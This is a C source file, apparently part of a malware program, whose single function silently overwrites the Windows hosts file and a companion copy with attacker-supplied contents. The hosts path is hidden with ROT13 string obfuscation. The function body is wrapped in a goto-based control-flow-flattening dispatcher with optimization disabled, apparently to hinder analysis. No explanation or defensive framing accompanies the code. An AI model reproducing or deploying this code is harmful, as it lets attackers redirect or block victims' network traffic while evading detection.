#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _HOSTSFile(void)
{
    char system_directory[256];
    char hosts_file_path[298];
    char hosts_backup_path[298];
    FILE *hosts_file, *temp_hosts_file;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetSystemDirectoryA(system_directory, sizeof(system_directory));
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    memset(hosts_file_path, 0, sizeof(hosts_file_path));
    _CiphStr(hosts_file_path, "\\qeviref\\rgp\\UBFGF");
    strcat(system_directory, hosts_file_path);
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    strcpy(hosts_backup_path, system_directory);
    strcat(hosts_backup_path, ".MVP");
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    hosts_file = fopen(system_directory, "wb");
    temp_hosts_file = fopen(hosts_backup_path, "wb");
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    fputs(HOSTS_f, hosts_file);
    fputs(HOSTS_f, temp_hosts_file);
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    fclose(hosts_file);
    fclose(temp_hosts_file);
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
